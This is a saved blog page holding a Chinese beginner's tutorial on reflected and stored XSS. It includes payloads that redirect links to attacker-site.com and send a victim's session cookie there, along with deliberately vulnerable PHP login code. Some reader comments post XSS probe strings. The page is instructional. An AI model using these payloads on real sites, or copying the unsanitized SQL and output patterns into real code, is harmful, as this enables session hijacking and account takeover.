+        <!-- 管理 -->
+        <li id="topMnu-dashboard">
+            <a id="lnkDashboard" href="http://www.cnblogs.com/bangerlee/admin/EditPosts.aspx">Dashboard</a></li>
+        <li>
+            <a id="lnkLogin" href="http://passport.cnblogs.com/login.aspx?ReturnUrl=http://www.cnblogs.com/bangerlee/archive/2013/04/06/3002142.html">Login</a></li>
+    </ul>
+
+    <script type="text/javascript">
+        var m = window.__blog.topMenuRendered;
+        if (m) { m(__$("topMnu")); }
+    </script>
+
+    <div id="header">
+        <ul id="menu">
+            <!-- 首页，当前section加上current类 -->
+            <li id="menu-home" class="current">
+                <a id="lnkHome" href="http://www.cnblogs.com/bangerlee/">Home</a></li>
+            <!-- 联系 -->
+            <li id="menu-contact">
+                <a id="lnkContact" href="http://space.cnblogs.com/msg/send/bangerlee">Contact</a></li>
+            <!-- 相册 -->
+            <li id="menu-gallary">
+                <a id="lnkGallery" href="http://www.cnblogs.com/bangerlee/gallery.html">Gallery</a></li>
+            <!-- Rss订阅 -->
+            <li id="rss">
+                <a id="lnkRss" href="http://www.cnblogs.com/bangerlee/rss">RSS</a></li>
+        </ul>
+        <div id="newmsg"></div>
+        <h1>
+            <!-- 主标题 -->
+            <a id="lnkBlogTitle" href="http://www.cnblogs.com/bangerlee/">bangerlee</a>
+            <!-- 子标题 -->
+            <small>
+                </small>
+        </h1>
+    </div>
+
+    <script type="text/javascript">
+        var m = window.__blog.headerRendered;
+        if (m) { m(__$("header")); }
+    </script>
+
+    <div id="wrapper">
+        <div id="content">
+            <script type="text/javascript">
+                var m = window.__blog.preRenderPosts;
+                if (m) { m(); }
+            </script>
+            
+<div id="post_detail">
+<div class="post" id="post">
+    <a name="top"></a>
+    <h2><a id="cb_post_title_url" href="http://www.cnblogs.com/bangerlee/archive/2013/04/06/3002142.html">xss攻击入门</a></h2>
+    <small>2013-04-06 14:28 by bangerlee, <span id="post_view_count">50419</span> 阅读, <span id="post_comment_count">12</span> 评论, <a href="#" onclick="AddToWz(3002142);return false;">收藏</a>,  <a href="http://i.cnblogs.com/EditPosts.aspx?postid=3002142" rel="nofollow">编辑</a></small>
+    <div class="entry">
+        <div id="cnblogs_post_body"><p>xss表示Cross Site Scripting(跨站脚本攻击)，它与SQL注入攻击类似，SQL注入攻击中以SQL语句作为用户输入，从而达到查询/修改/删除数据的目的，而在xss攻击中，通过插入恶意脚本，实现对用户游览器的控制。</p>
+<p>xss攻击可以分成两种类型：</p>
+<ol>
+<li>非持久型攻击</li>
+<li>持久型攻击</li>
+</ol>
+<p>下面我们通过具体例子，了解两种类型xss攻击。</p>
+<p>&nbsp;</p>
+<p><strong>1.非持久型xss攻击</strong></p>
+<p>顾名思义，非持久型xss攻击是一次性的，仅对当次的页面访问产生影响。非持久型xss攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。</p>
+<p>假设有以下index.php页面：</p>
+<div class="cnblogs_code">
+<pre>&lt;?<span style="color: #000000;">php
+</span><span style="color: #800080;">$name</span> = <span style="color: #800080;">$_GET</span>['name'<span style="color: #000000;">];
+</span><span style="color: #0000ff;">echo</span> "Welcome <span style="color: #800080;">$name</span>&lt;br&gt;"<span style="color: #000000;">;
+</span><span style="color: #0000ff;">echo</span> "&lt;a href="http:<span style="color: #008000;">//www.cnblogs.com/bangerlee</span><span style="color: #008000;">/"&gt;Click to Download&lt;/a&gt;";</span>
+?&gt;</pre>
+</div>
+<p>该页面显示两行信息：</p>
+<ul>
+<li>从URI获取 'name' 参数，并在页面显示</li>
+<li>显示跳转到一条URL的链接</li>
+</ul>
+<p>这时，当攻击者给出以下URL链接：</p>
+<div class="cnblogs_code">
+<pre>index.php?name=guest&lt;script&gt;alert('attacked')&lt;/script&gt;</pre>
+</div>
+<p>当用户点击该链接时，将产生以下html代码，带'attacked'的告警提示框弹出：</p>
+<div class="cnblogs_code">
+<pre><span style="color: #000000;">Welcome guest
+</span><span style="color: #0000ff;">&lt;</span><span style="color: #800000;">script</span><span style="color: #0000ff;">&gt;</span><span style="background-color: #f5f5f5; color: #000000;">alert(</span><span style="background-color: #f5f5f5; color: #000000;">'</span><span style="background-color: #f5f5f5; color: #000000;">attacked</span><span style="background-color: #f5f5f5; color: #000000;">'</span><span style="background-color: #f5f5f5; color: #000000;">)</span><span style="color: #0000ff;">&lt;/</span><span style="color: #800000;">script</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #0000ff;">&lt;</span><span style="color: #800000;">br</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #0000ff;">&lt;</span><span style="color: #800000;">a </span><span style="color: #ff0000;">href</span><span style="color: #0000ff;">='http://www.cnblogs.com/bangerlee/'</span><span style="color: #0000ff;">&gt;</span>Click to Download<span style="color: #0000ff;">&lt;/</span><span style="color: #800000;">a</span><span style="color: #0000ff;">&gt;</span></pre>
+</div>
+<p>&nbsp;</p>
+<p>除了插入alert代码，攻击者还可以通过以下URL实现修改链接的目的：</p>
+<div class="cnblogs_code"><div class="cnblogs_code_toolbar"><span class="cnblogs_code_copy"><a href="javascript:void(0);" onclick="copyCnblogsCode(this)" title="复制代码"><img src="xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%20-%20bangerlee%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/copycode.gif" alt="复制代码"></a></span></div>
+<pre>index.php?name=<br><span style="color: #0000ff;">&lt;</span><span style="color: #800000;">script</span><span style="color: #0000ff;">&gt;<br></span><span style="background-color: #f5f5f5; color: #000000;">window.onload </span><span style="background-color: #f5f5f5; color: #000000;">=</span> <span style="background-color: #f5f5f5; color: #0000ff;">function</span><span style="background-color: #f5f5f5; color: #000000;">() {<br></span><span style="background-color: #f5f5f5; color: #0000ff;">var</span><span style="background-color: #f5f5f5; color: #000000;"> link</span><span style="background-color: #f5f5f5; color: #000000;">=</span><span style="background-color: #f5f5f5; color: #000000;">document.getElementsByTagName(</span><span style="background-color: #f5f5f5; color: #000000;">"</span><span style="background-color: #f5f5f5; color: #000000;">a</span><span style="background-color: #f5f5f5; color: #000000;">"</span><span style="background-color: #f5f5f5; color: #000000;">);link[</span><span style="background-color: #f5f5f5; color: #000000;">0</span><span style="background-color: #f5f5f5; color: #000000;">].href</span><span style="background-color: #f5f5f5; color: #000000;">=</span><span style="background-color: #f5f5f5; color: #000000;">"</span><span style="background-color: #f5f5f5; color: #000000;">http://attacker-site.com/</span><span style="background-color: #f5f5f5; color: #000000;">"</span><span style="background-color: #f5f5f5; color: #000000;">;}<br></span><span style="background-color: #f5f5f5; color: #000000;">&lt;/</span><span style="background-color: #f5f5f5; color: #000000;">script</span><span style="background-color: #f5f5f5; color: #000000;">&gt;</span></pre>
+<div class="cnblogs_code_toolbar"><span class="cnblogs_code_copy"><a href="javascript:void(0);" onclick="copyCnblogsCode(this)" title="复制代码"><img src="xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%20-%20bangerlee%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/copycode.gif" alt="复制代码"></a></span></div></div>
+<p>当用户点击以上攻击者提供的URL时，index.php页面被植入脚本，页面源码如下：</p>
+<div class="cnblogs_code"><div class="cnblogs_code_toolbar"><span class="cnblogs_code_copy"><a href="javascript:void(0);" onclick="copyCnblogsCode(this)" title="复制代码"><img src="xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%20-%20bangerlee%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/copycode.gif" alt="复制代码"></a></span></div>
+<pre><span style="color: #000000;">Welcome 
+</span><span style="color: #0000ff;">&lt;</span><span style="color: #800000;">script</span><span style="color: #0000ff;">&gt;</span><span style="background-color: #f5f5f5; color: #000000;">
+window.onload </span><span style="background-color: #f5f5f5; color: #000000;">=</span> <span style="background-color: #f5f5f5; color: #0000ff;">function</span><span style="background-color: #f5f5f5; color: #000000;">() {
+</span><span style="background-color: #f5f5f5; color: #0000ff;">var</span><span style="background-color: #f5f5f5; color: #000000;"> link</span><span style="background-color: #f5f5f5; color: #000000;">=</span><span style="background-color: #f5f5f5; color: #000000;">document.getElementsByTagName(</span><span style="background-color: #f5f5f5; color: #000000;">"</span><span style="background-color: #f5f5f5; color: #000000;">a</span><span style="background-color: #f5f5f5; color: #000000;">"</span><span style="background-color: #f5f5f5; color: #000000;">);link[</span><span style="background-color: #f5f5f5; color: #000000;">0</span><span style="background-color: #f5f5f5; color: #000000;">].href</span><span style="background-color: #f5f5f5; color: #000000;">=</span><span style="background-color: #f5f5f5; color: #000000;">"</span><span style="background-color: #f5f5f5; color: #000000;">http://attacker-site.com/</span><span style="background-color: #f5f5f5; color: #000000;">"</span><span style="background-color: #f5f5f5; color: #000000;">;}
+</span><span style="color: #0000ff;">&lt;/</span><span style="color: #800000;">script</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #0000ff;">&lt;</span><span style="color: #800000;">br</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #0000ff;">&lt;</span><span style="color: #800000;">a </span><span style="color: #ff0000;">href</span><span style="color: #0000ff;">='http://www.cnblogs.com/bangerlee/'</span><span style="color: #0000ff;">&gt;</span>Click to Download<span style="color: #0000ff;">&lt;/</span><span style="color: #800000;">a</span><span style="color: #0000ff;">&gt;</span></pre>
+<div class="cnblogs_code_toolbar"><span class="cnblogs_code_copy"><a href="javascript:void(0);" onclick="copyCnblogsCode(this)" title="复制代码"><img src="xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%20-%20bangerlee%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/copycode.gif" alt="复制代码"></a></span></div></div>
+<p>用户再点击 "Click to Download" 时，将跳转至攻击者提供的链接。</p>
+<p>&nbsp;</p>
+<p>对于用于攻击的URL，攻击者一般不会直接使用以上可读形式，而是将其转换成ASCII码，以下URL同样用于实现链接地址变更：</p>
+<div class="cnblogs_code">
+<pre>index.php?name=%3c%73%63%72%69%70%74%3e%77%69%6e%64%6f%77%2e%6f%6e%6c%6f%61%64%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%76%61%72%20%6c%69%6e%6b%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%73%42%79%54%61%67%4e%61%6d%65%28%22%61%22%29%3b%6c%69%6e%6b%5b%30%5d%2e%68%72%65%66%3d%22%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%2d%73%69%74%65%2e%63%6f%6d%2f%22%3b%7d%3c%2f%73%63%72%69%70%74%3e</pre>
+</div>
+<p>&nbsp;</p>
+<p><strong>2.持久型xss攻击</strong></p>
+<p>持久型xss攻击会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。下面来看一个利用持久型xss攻击获取session id的实例。</p>
+<p>&nbsp;</p>
+<p><strong>session背景知识</strong></p>
+<p>我们知道HTTP是一个无状态维持的协议，所有请求/应答都是独立的，其间不保存状态信息。但有些场景下我们需要维护状态信息，例如用户登录完web应用后，再一定时间内，用户再进行登录，应不需要再输入用户名/密码进行鉴权。</p>
+<p>这时我们用cookie和session解决状态维护问题，当用户首次登入时，服务器为该用户创建一个 session ID，同时向游览器传送一个 cookie，cookie保存会话连接中用到的数据，session ID作为会话标识，游览器后续的请求均基于该session ID。</p>
+<p>&nbsp;</p>
+<p>攻击者可以提供一个攻击链接，当用户点击该链接时，向攻击者自己的服务器发送一条保存有用户session ID的信息，这样就可以窃取到用户的session ID，得到用户的执行权限。</p>
+<p>&nbsp;</p>
+<p>现有以下login.php，其根据 user_name 在数据中查找相应的 pass_word，然后将用户提供的 password 与查数据库所得的 pass_word 进行比较，如果验证成功则创建对应于 user_name 的 session。</p>
+<div class="cnblogs_code" onclick="cnblogs_code_show('2ac55173-c6af-4a39-ad00-e5d1a04f3453')"><img id="code_img_closed_2ac55173-c6af-4a39-ad00-e5d1a04f3453" class="code_img_closed" src="xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%20-%20bangerlee%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/ContractedBlock.gif" alt=""><img id="code_img_opened_2ac55173-c6af-4a39-ad00-e5d1a04f3453" class="code_img_opened" style="display: none;" onclick="cnblogs_code_hide('2ac55173-c6af-4a39-ad00-e5d1a04f3453',event)" src="xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%20-%20bangerlee%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/ExpandedBlockStart.gif" alt=""><span class="cnblogs_code_collapse">View Code </span>
+<div id="cnblogs_code_open_2ac55173-c6af-4a39-ad00-e5d1a04f3453" class="cnblogs_code_hide">
+<pre>&lt;?<span style="color: #000000;">php
+</span><span style="color: #800080;">$Host</span>= '192.168.1.8'<span style="color: #000000;">;
+</span><span style="color: #800080;">$Dbname</span>= 'app'<span style="color: #000000;">;
+</span><span style="color: #800080;">$User</span>= 'yyy'<span style="color: #000000;">;
+</span><span style="color: #800080;">$Password</span>= 'xxx'<span style="color: #000000;">;
+</span><span style="color: #800080;">$Schema</span> = 'test'<span style="color: #000000;">;
+
+</span><span style="color: #800080;">$Conection_string</span>="host=<span style="color: #800080;">$Host</span> dbname=<span style="color: #800080;">$Dbname</span> user=<span style="color: #800080;">$User</span> password=<span style="color: #800080;">$Password</span>"<span style="color: #000000;">;
+
+</span><span style="color: #008000;">/*</span><span style="color: #008000;"> Connect with database asking for a new connection</span><span style="color: #008000;">*/</span>
+<span style="color: #800080;">$Connect</span>=pg_connect(<span style="color: #800080;">$Conection_string</span>,<span style="color: #800080;">$PGSQL_CONNECT_FORCE_NEW</span><span style="color: #000000;">);
+
+</span><span style="color: #008000;">/*</span><span style="color: #008000;"> Error checking the connection string </span><span style="color: #008000;">*/</span>
+<span style="color: #0000ff;">if</span> (!<span style="color: #800080;">$Connect</span><span style="color: #000000;">) {
+ </span><span style="color: #0000ff;">echo</span> "Database Connection Failure"<span style="color: #000000;">;
+ </span><span style="color: #0000ff;">exit</span><span style="color: #000000;">;
+}
+
+</span><span style="color: #800080;">$query</span>="SELECT user_name,password from <span style="color: #800080;">$Schema</span>.members where user_name='".<span style="color: #800080;">$_POST</span>['user_name']."';"<span style="color: #000000;">;
+
+</span><span style="color: #800080;">$result</span>=pg_query(<span style="color: #800080;">$Connect</span>,<span style="color: #800080;">$query</span><span style="color: #000000;">);
+</span><span style="color: #800080;">$row</span>=pg_fetch_array(<span style="color: #800080;">$result</span>,<span style="color: #0000ff;">NULL</span>,<span style="color: #000000;">PGSQL_ASSOC);
+
+</span><span style="color: #800080;">$user_pass</span> = <span style="color: #008080;">md5</span>(<span style="color: #800080;">$_POST</span>['pass_word'<span style="color: #000000;">]);
+</span><span style="color: #800080;">$user_name</span> = <span style="color: #800080;">$row</span>['user_name'<span style="color: #000000;">];
+
+</span><span style="color: #0000ff;">if</span>(<span style="color: #008080;">strcmp</span>(<span style="color: #800080;">$user_pass</span>,<span style="color: #800080;">$row</span>['password'])!=0<span style="color: #000000;">) {
+ </span><span style="color: #0000ff;">echo</span> "Login failed"<span style="color: #000000;">;
+}
+</span><span style="color: #0000ff;">else</span><span style="color: #000000;"> {
+ </span><span style="color: #008000;">#</span><span style="color: #008000;"> Start the session</span>
+ <span style="color: #008080;">session_start</span><span style="color: #000000;">();
+ </span><span style="color: #800080;">$_SESSION</span>['USER_NAME'] = <span style="color: #800080;">$user_name</span><span style="color: #000000;">;
+ </span><span style="color: #0000ff;">echo</span> "&lt;head&gt; &lt;meta http-equiv=\"Refresh\" content=\"0;url=home.php\" &gt; &lt;/head&gt;"<span style="color: #000000;">;
+}
+</span>?&gt;</pre>
+</div>
+</div>
+<p>&nbsp;</p>
+<p>另有以下home.php，其根据登入的用户是 admin 还是其他用户，显示不同内容，对于admin，其列出所有用户，对于其他用户，提供包含输入框的form，可在数据库中插入新的用户名信息。</p>
+<div class="cnblogs_code" onclick="cnblogs_code_show('07f70f2f-ed08-4fea-9693-5c79de5a1a6d')"><img id="code_img_closed_07f70f2f-ed08-4fea-9693-5c79de5a1a6d" class="code_img_closed" src="xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%20-%20bangerlee%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/ContractedBlock.gif" alt=""><img id="code_img_opened_07f70f2f-ed08-4fea-9693-5c79de5a1a6d" class="code_img_opened" style="display: none;" onclick="cnblogs_code_hide('07f70f2f-ed08-4fea-9693-5c79de5a1a6d',event)" src="xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%20-%20bangerlee%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/ExpandedBlockStart.gif" alt=""><span class="cnblogs_code_collapse">View Code </span>
+<div id="cnblogs_code_open_07f70f2f-ed08-4fea-9693-5c79de5a1a6d" class="cnblogs_code_hide">
+<pre>&lt;?<span style="color: #000000;">php
+</span><span style="color: #008080;">session_start</span><span style="color: #000000;">();
+</span><span style="color: #0000ff;">if</span>(!<span style="color: #800080;">$_SESSION</span>['USER_NAME'<span style="color: #000000;">]) {
+ </span><span style="color: #0000ff;">echo</span> "Need to login"<span style="color: #000000;">;
+}
+</span><span style="color: #0000ff;">else</span><span style="color: #000000;"> {
+ </span><span style="color: #800080;">$Host</span>= '192.168.1.8'<span style="color: #000000;">;
+ </span><span style="color: #800080;">$Dbname</span>= 'app'<span style="color: #000000;">;
+ </span><span style="color: #800080;">$User</span>= 'yyy'<span style="color: #000000;">;
+ </span><span style="color: #800080;">$Password</span>= 'xxx'<span style="color: #000000;">;
+ </span><span style="color: #800080;">$Schema</span> = 'test'<span style="color: #000000;">;
+ </span><span style="color: #800080;">$Conection_string</span>="host=<span style="color: #800080;">$Host</span> dbname=<span style="color: #800080;">$Dbname</span> user=<span style="color: #800080;">$User</span> password=<span style="color: #800080;">$Password</span>"<span style="color: #000000;">;
+ </span><span style="color: #800080;">$Connect</span>=pg_connect(<span style="color: #800080;">$Conection_string</span>,<span style="color: #800080;">$PGSQL_CONNECT_FORCE_NEW</span><span style="color: #000000;">);
+ </span><span style="color: #0000ff;">if</span>(<span style="color: #800080;">$_SERVER</span>['REQUEST_METHOD'] == "POST"<span style="color: #000000;">) {
+  </span><span style="color: #800080;">$query</span>="update <span style="color: #800080;">$Schema</span>.members set display_name='".<span style="color: #800080;">$_POST</span>['disp_name']."' where user_name='".<span style="color: #800080;">$_SESSION</span>['USER_NAME']."';"<span style="color: #000000;">;
+  pg_query(</span><span style="color: #800080;">$Connect</span>,<span style="color: #800080;">$query</span><span style="color: #000000;">);
+  </span><span style="color: #0000ff;">echo</span> "Update Success"<span style="color: #000000;">;
+ }
+ </span><span style="color: #0000ff;">else</span><span style="color: #000000;"> {
+  </span><span style="color: #0000ff;">if</span>(<span style="color: #008080;">strcmp</span>(<span style="color: #800080;">$_SESSION</span>['USER_NAME'],'admin')==0<span style="color: #000000;">) {
+   </span><span style="color: #0000ff;">echo</span> "Welcome admin&lt;br&gt;&lt;hr&gt;"<span style="color: #000000;">;
+   </span><span style="color: #0000ff;">echo</span> "List of user's are&lt;br&gt;"<span style="color: #000000;">;
+   </span><span style="color: #800080;">$query</span> = "select display_name from <span style="color: #800080;">$Schema</span>.members where user_name!='admin'"<span style="color: #000000;">;
+   </span><span style="color: #800080;">$res</span> = pg_query(<span style="color: #800080;">$Connect</span>,<span style="color: #800080;">$query</span><span style="color: #000000;">);
+   </span><span style="color: #0000ff;">while</span>(<span style="color: #800080;">$row</span>=pg_fetch_array(<span style="color: #800080;">$res</span>,<span style="color: #0000ff;">NULL</span>,<span style="color: #000000;">PGSQL_ASSOC)) {
+    </span><span style="color: #0000ff;">echo</span> "<span style="color: #800080;">$row</span>[display_name]&lt;br&gt;"<span style="color: #000000;">;
+   }
+ }
+ </span><span style="color: #0000ff;">else</span><span style="color: #000000;"> {
+  </span><span style="color: #0000ff;">echo</span> "&lt;form name=\"tgs\" id=\"tgs\" method=\"post\" action=\"home.php\"&gt;"<span style="color: #000000;">;
+  </span><span style="color: #0000ff;">echo</span> "Update display name:&lt;input type=\"text\" id=\"disp_name\" name=\"disp_name\" value=\"\"&gt;"<span style="color: #000000;">;
+  </span><span style="color: #0000ff;">echo</span> "&lt;input type=\"submit\" value=\"Update\"&gt;"<span style="color: #000000;">;
+ }
+}
+}
+</span>?&gt;</pre>
+</div>
+</div>
+<p>&nbsp;</p>
+<p>注意以上场景中，对 admin 和其他用户进行了不同的权限设置，admin可以看到所有用户列表，下面我们来看如何获取 admin 的session ID，从而使得其他用户也能获得 admin 的权限。</p>
+<p>&nbsp;</p>
+<p>首先，攻击者以一个普通用户登录进来，然后在输入框中提交以下数据：</p>
+<div class="cnblogs_code">
+<pre><span style="color: #0000ff;">&lt;</span><span style="color: #800000;">a </span><span style="color: #ff0000;">href</span><span style="color: #0000ff;">=# </span><span style="color: #ff0000;">onclick</span><span style="color: #0000ff;">=\"document.location=\'http://attacker-site.com/xss.php?c=\'+escape\(document.cookie\)\;\"</span><span style="color: #0000ff;">&gt;<span style="color: #000000;"><strong>bangerlee</strong></span></span><span style="color: #0000ff;">&lt;/</span><span style="color: #800000;">a</span><span style="color: #0000ff;">&gt;</span></pre>
+</div>
+<p>&nbsp;</p>
+<p>攻击者提交了条带&lt;a&gt;标签的数据，该条数据将保存在数据库中，而当 admin 用户登入时，包含 "bangerlee" 的用户列表将显示，如果 admin 用户点击 "bangerlee" 时，在 "attacker-site.com" 所在的服务器上，攻击者就可以窃取到 admin 的session-id：</p>
+<div class="cnblogs_code">
+<pre>xss.php?c=PHPSESSID%3Dvmcsjsgear6gsogpu7o2imr9f3</pre>
+</div>
+<p>有了该session-id，攻击者在会话有效期内即可获得 admin 用户的权限，并且由于攻击数据已添加入数据库，只要攻击数据未被删除，那么攻击还有可能生效，是持久性的。</p>
+<p>&nbsp;</p>
+<p>当然，不是只有持久型xss攻击才能窃取session ID、用户的cookie信息，用非持久型xss也可以，只要引导用户点击某链接，将 document.cookie 信息传到指定服务器即可，以上仅作为说明持久型xss攻击的举例。</p></div><div id="MySignature"></div>
+        <div class="clear"></div>
+        <div id="blog_post_info_block">
+        <div id="blog_post_info"><div id="green_channel">
+<a href="javascript:void(0);" id="green_channel_digg" onclick="DiggIt(3002142,cb_blogId,1);green_channel_success(this,'谢谢推荐！');">好文要顶</a>
+<a id="green_channel_follow" onclick="c_follow();" href="javascript:void(0);">关注我</a>
+<a id="green_channel_favorite" onclick="AddToWz(cb_entryId);return false;" href="javascript:void(0);">收藏该文</a><a id="green_channel_contact" href="http://msg.cnblogs.com/send/bangerlee" target="_blank">联系我</a>
+<a id="green_channel_weibo" href="javascript:void(0);" title="分享至新浪微博" onclick="ShareToTsina()"><img src="xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%20-%20bangerlee%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/icon_weibo_24.png" alt=""></a>
+<a id="green_channel_wechat" href="javascript:void(0);" title="分享至微信" onclick="shareOnWechat()"><img src="xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%20-%20bangerlee%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/wechat.png" alt=""></a>
+</div>
+<div id="author_profile">
+<div id="author_profile_info" class="author_profile_info">
+<a href="http://home.cnblogs.com/u/bangerlee/" target="_blank"><img src="xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%20-%20bangerlee%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/u116770.jpg" class="author_avatar" alt=""></a>
+<div id="author_profile_detail" class="author_profile_info">
+<a href="http://home.cnblogs.com/u/bangerlee/">bangerlee</a><br>
+<a href="http://home.cnblogs.com/u/bangerlee/followees">关注 - 0</a><br>
+<a href="http://home.cnblogs.com/u/bangerlee/followers">粉丝 - 184</a>
+</div>
+</div>
+<div class="clear"></div>
+<div id="author_profile_honor"></div>
+<div id="author_profile_follow">
+    <a href="javascript:void(0);" onclick="c_follow();return false;">+加关注</a>
+</div>
+</div>
+<div id="div_digg">										
+    <div class="diggit" onclick="votePost(3002142,'Digg')">
+        <span class="diggnum" id="digg_count">15</span>
+    </div>
+	<div class="buryit" onclick="votePost(3002142,'Bury')"> 
+		<span class="burynum" id="bury_count">0</span>
+	</div>
+	<div class="clear"></div>	
+	<div class="diggword" id="digg_tips">
+    (请您对文章做出评价)
+    </div>	
+</div>
+</div>
+        <div class="clear"></div>
+        <div id="post_next_prev"><a href="http://www.cnblogs.com/bangerlee/archive/2013/02/27/2935422.html" class="p_n_p_prefix">« </a> 上一篇：<a href="http://www.cnblogs.com/bangerlee/archive/2013/02/27/2935422.html" title="发布于2013-02-27 18:01">9个常用iptables配置实例</a><br></div>
+    </div>
+</div>
+    <ul class="postmetadata">
+        <li class="icon_cat" id="BlogPostCategory">分类: <a href="http://www.cnblogs.com/bangerlee/category/385741.html">hack</a></li>
+        <li class="icon_bullet" id="EntryTag">标签: <a href="http://www.cnblogs.com/bangerlee/tag/hack/">hack</a>, <a href="http://www.cnblogs.com/bangerlee/tag/%E5%AE%89%E5%85%A8/">安全</a>, <a href="http://www.cnblogs.com/bangerlee/tag/xss/">xss</a></li>
+    </ul>
+</div>
+<script type="text/javascript">var allowComments=true,isLogined=false,cb_blogId=96117,cb_entryId=3002142,cb_blogApp=currentBlogApp,cb_blogUserGuid='653d7858-f024-df11-ba8f-001cf0cd104b',cb_entryCreatedDate='2013/4/6 14:28:00';loadViewCount(cb_entryId);</script>
+<script type="text/javascript">
+    var m = window.__blog.postRendered;
+    if (m) { m(__$("post")); }
+</script>
+<script type="text/javascript">
+    var m = window.__blog.postRenderPosts;
+    if (m) { m(); }
+</script>
+</div><a name="!comments"></a><div id="blog-comments-placeholder"><div id="comments_pager_top"></div>
+<a class="addcomment" href="#comment_tip">Add your comment</a>
+<h3 id="comments"></h3>
+<div class="feedbackNoItems"></div>
+
+
+<ol class="commentlist" id="commentList">	
+
+		<li class="alt">
+			<h5>
+				<cite><a href="#2650860" class="layer">#1楼</a><a name="2650860" id="comment_anchor_2650860"></a></cite> <a id="a_comment_author_2650860" href="http://www.cnblogs.com/jijunjian/" target="_blank">戢俊建</a> <a href="http://msg.cnblogs.com/send/%E6%88%A2%E4%BF%8A%E5%BB%BA" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2013-04-07 08:20</span></small>
+			</h5>
+			<div id="comment_body_2650860" class="blog_comment_body">有用，赞一个</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(2650860,'Digg',this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(2650860,'Bury',this)">反对(0)</a></div><span id="comment_2650860_avatar" style="display:none;">http://pic.cnblogs.com/face/88102/20140604201311.png</span>
+			<div class="opt_comment"><span class="comment_actions"></span></div>
+		</li>
+	
+		<li class="alt">
+			<h5>
+				<cite><a href="#2852471" class="layer">#2楼</a><a name="2852471" id="comment_anchor_2852471"></a></cite> <a id="a_comment_author_2852471" href="http://home.cnblogs.com/u/597053/" target="_blank">03sec-sky</a> <a href="http://msg.cnblogs.com/send/03sec-sky" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2014-01-05 23:48</span></small>
+			</h5>
+			<div id="comment_body_2852471" class="blog_comment_body"><a href="http://www.cnblogs.com/bangerlee/archive/2013/04/06/%3e%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73%63%72%69%70%74%3e" target="_blank">/%3e%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73%63%72%69%70%74%3e</a></div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(2852471,'Digg',this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(2852471,'Bury',this)">反对(0)</a></div>
+			<div class="opt_comment"><span class="comment_actions"></span></div>
+		</li>
+	
+		<li class="alt">
+			<h5>
+				<cite><a href="#2852472" class="layer">#3楼</a><a name="2852472" id="comment_anchor_2852472"></a></cite> <a id="a_comment_author_2852472" href="http://home.cnblogs.com/u/597053/" target="_blank">03sec-sky</a> <a href="http://msg.cnblogs.com/send/03sec-sky" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2014-01-05 23:48</span></small>
+			</h5>
+			<div id="comment_body_2852472" class="blog_comment_body">%3cscript%3ealert('XSS')%3c/script%3e</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(2852472,'Digg',this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(2852472,'Bury',this)">反对(0)</a></div>
+			<div class="opt_comment"><span class="comment_actions"></span></div>
+		</li>
+	
+		<li class="alt">
+			<h5>
+				<cite><a href="#2971558" class="layer">#4楼</a><a name="2971558" id="comment_anchor_2971558"></a></cite> <a id="a_comment_author_2971558" href="http://www.cnblogs.com/qingbenjiaren/" target="_blank">假装高兴</a> <a href="http://msg.cnblogs.com/send/%E5%81%87%E8%A3%85%E9%AB%98%E5%85%B4" title="发送站内短消息" class="sendMsg2This">&nbsp;</a><small> <span class="comment_date">2014-06-25 19:01</span></small>
+			</h5>
+			<div id="comment_body_2971558" class="blog_comment_body">代码要对数据过滤，或者用pdo，要不然后果很严重</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(2971558,'Digg',this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(2971558,'Bury',this)">反对(0)</a></div>
+			<div class="opt_comment"><span class="comment_actions"></span></div>
+		</li>
+	
+		<li class="alt">
